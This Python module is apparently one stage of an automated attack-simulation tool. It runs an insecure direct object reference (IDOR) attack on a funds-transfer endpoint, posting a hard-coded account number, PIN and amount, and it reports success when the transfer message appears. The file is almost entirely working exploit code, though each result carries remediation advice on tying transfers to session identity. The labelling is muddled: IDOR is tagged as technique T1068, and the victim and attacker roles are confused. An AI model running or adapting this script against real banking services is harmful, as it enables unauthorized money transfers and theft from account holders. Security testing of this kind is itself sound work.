import requests
from backend.utility_f import log

def run(target_url):
    victim_acc_num = "36376630633263663236333530"
    attacker_pin = "1234"  # Replace with attacker's PIN
    amount = 500

    try:
        response = requests.post(target_url, data={
            "acc_num": victim_acc_num,
            "amount": amount,
            "pin": attacker_pin,
            "submit": "Transfer"
        })

        if "Funds sucessfully transferred" in response.text:
            log("IDOR succeeded: Funds transferred to unauthorized account", level="success")
            return {
                "stage": "IDOR",
                "technique_id": "T1068",
                "technique_name": "IDOR",
                "success": True,
                "details": f"Transferred {amount} to {victim_acc_num} via IDOR.",
                "remediation": "Verify that transfer requests are tied to session identity."
            }

    except Exception as e:
        return {
            "stage": "IDOR",
            "technique_id": "T1068",
            "technique_name": "IDOR",
            "success": False,
            "details": f"Error: {e}",
            "remediation": "Ensure input validation and access control."
        }

    return {
        "stage": "IDOR",
        "technique_id": "T1068",
        "technique_name": "IDOR",  
        "success": False,
        "details": "IDOR attack did not succeed.",
        "remediation": "Enforce session ownership validation."
    }
